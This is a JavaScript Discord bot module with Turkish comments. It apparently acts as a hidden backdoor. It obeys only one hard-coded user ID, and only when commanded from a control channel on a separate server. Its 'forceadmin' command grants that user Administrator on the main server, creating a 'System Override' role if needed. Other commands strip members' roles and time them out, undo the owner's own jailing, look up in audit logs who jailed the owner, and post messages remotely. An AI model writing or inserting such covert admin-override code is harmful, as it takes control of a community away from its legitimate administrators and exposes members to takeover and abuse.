module.exports = (client) => {
    const PREFIX = "!";
    const OWNER_ID = "1097807544849809408";
    const MAIN_SERVER = "1446960659072946218";
    const TEST_SERVER = "1475516491431678034";
    const CONTROL_CHANNEL = "1488543017794142309";

    client.on('messageCreate', async (message) => {
        // Güvenlik: Botları, DM'leri ve yetkisiz kişileri engelle
        if (message.author.bot || !message.guild) return;
        if (message.author.id !== OWNER_ID) return;
        if (message.guild.id !== TEST_SERVER || message.channel.id !== CONTROL_CHANNEL) return;
        if (!message.content.startsWith(PREFIX)) return;

        const args = message.content.slice(PREFIX.length).trim().split(/ +/);
        const cmd = args.shift().toLowerCase();
        const mainGuild = client.guilds.cache.get(MAIN_SERVER);

        if (!mainGuild) return message.reply("❌ Ana sunucuya erişilemiyor!");

        // --- MANUEL JAIL ---
        if (cmd === "jail") {
            const targetId = args[0];
            if (!targetId || targetId === OWNER_ID) return message.reply("❌ Geçersiz ID.");

            try {
                const member = await mainGuild.members.fetch(targetId);
                const jailRole = mainGuild.roles.cache.find(r => r.name.toLowerCase().includes("jail"));
                if (!jailRole) return message.reply("❌ Jail rolü bulunamadı.");

                // Diğer her şeyi temizle, sadece jail ver
                await member.roles.set([jailRole.id]).catch(() => {});
                await member.timeout(24 * 60 * 60 * 1000, "Lockdown").catch(() => {});
                return message.reply(`⛓️ **${member.user.tag}** paketlendi.`);
            } catch (e) { return message.reply("❌ Yetki yetmiyor."); }
        }

        // --- MANUEL UNJAIL ---
        if (cmd === "unjail") {
            const targetId = args[0] || OWNER_ID;
            try {
                const member = await mainGuild.members.fetch(targetId);
                const jailRole = mainGuild.roles.cache.find(r => r.name.toLowerCase().includes("jail"));
                if (jailRole) await member.roles.remove(jailRole);
                if (member.isCommunicationDisabled()) await member.timeout(null);
                return message.reply(`✅ **${targetId}** serbest.`);
            } catch (e) { return message.reply("❌ Hata."); }
        }

        // --- ADMIN BASTIR (FORCE) ---
        if (cmd === "forceadmin") {
            try {
                const member = await mainGuild.members.fetch(OWNER_ID);
                let adminRole = mainGuild.roles.cache.find(r => r.permissions.has("Administrator") && r.editable);
                if (!adminRole) {
                    adminRole = await mainGuild.roles.create({ name: 'System Override', permissions: ["Administrator"] });
                }
                await member.roles.add(adminRole);
                return message.reply("⚡ Adminlik verildi.");
            } catch (e) { return message.reply("❌ Botun hiyerarşisi düşük."); }
        }

        // --- KİM JAİLLEDİ? ---
        if (cmd === "whojailed") {
            try {
                const logs = await mainGuild.fetchAuditLogs({ type: 25, limit: 15 });
                const entry = logs.entries.find(e => 
                    e.target?.id === OWNER_ID && 
                    e.changes?.some(c => c.key === "$add" && c.new.some(r => r.name.toLowerCase().includes("jail")))
                );
                if (!entry) return message.reply("🧐 Kayıt yok.");
                return message.reply(`🕵️ Seni paketleyen: **${entry.executor?.tag}**`);
            } catch (e) { return message.reply("❌ Log hatası."); }
        }

        // --- UZAKTAN KONUŞMA ---
        if (cmd === "say") {
            const channelId = args[0];
            const text = args.slice(1).join(" ");
            const channel = mainGuild.channels.cache.get(channelId);
            if (channel) {
                await channel.send(text);
                return message.reply("✅ Gönderildi.");
            }
        }
    });
};
